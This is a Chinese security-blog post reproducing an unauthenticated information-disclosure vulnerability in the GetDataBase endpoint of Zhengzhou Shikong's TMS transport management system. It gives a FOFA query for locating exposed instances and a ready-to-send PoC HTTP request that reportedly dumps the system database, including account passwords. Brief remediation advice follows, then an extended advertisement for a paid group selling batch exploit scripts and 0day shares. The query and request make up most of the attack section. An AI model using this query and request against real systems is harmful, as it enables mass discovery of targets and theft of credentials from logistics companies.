#  「漏洞复现」郑州时空-TMS运输管理系统 GetDataBase 信息泄露漏洞   
冷漠安全  冷漠安全   2025-01-01 11:22  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
郑州时空-TMS运输管理系统是一款专为物流运输企业设计的综合性管理软件，旨在提高运输效率、降低运输成本，并实现供应链的协同运作。系统基于现代计算机技术和物流管理方法，结合了郑州时空公司的专业经验和技术优势，为物流运输企业提供了一套高效、智能的运输管理解决方案。该系统支持多网点、多机构、多功能作业，能够全面满足企业的运输管理需求。适用于各类物流运输企业，包括运输公司、各企业下面的运输队等，特别适用于需要高效管理运输过程、降低运输成本并提升供应链效率的企业。  
  
0x03  
  
漏洞威胁  
  
郑州时空-TMS运输管理系统 GetDataBase 接口存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统内部数据库文件，泄露账号密码等重要凭证，导致网站处于极度不安全状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
body="/Images/ManLogin/name.png"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rb9HwOCMlMl5lhJtc0ibZKfT8Zqh5lupiaeV5AibRpLVAhVyd6ucFz0tN6fCJ751bb4HcSLuHFbBmCg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /ManLogin/GetDataBase HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rb9HwOCMlMl5lhJtc0ibZKfxOMjAxPibrl4GP7vL5E1nDFjp3TicOQwEo3ozGTic3q6EmoG3gpoj4okA/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rb9HwOCMlMl5lhJtc0ibZKfp5ZptZxSCQsQmhakkB1ApuvF8jOKn0gptnTmcibmE9jEg8plszEiar6A/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rb9HwOCMlMl5lhJtc0ibZKfF8d1xpVqKYUrxaYYPgVBccmfZAwiaXGgXZCDjnWCQ6QNH5EWp1MKMtA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rb9HwOCMlMl5lhJtc0ibZKf7jM8NWrbg98Iq5fiaQrr6Tgt2hMdVc6Ejaf1c9A9ube7Im5el9jnvew/640?wx_fmt=gif&from=appmsg "")  
  
  
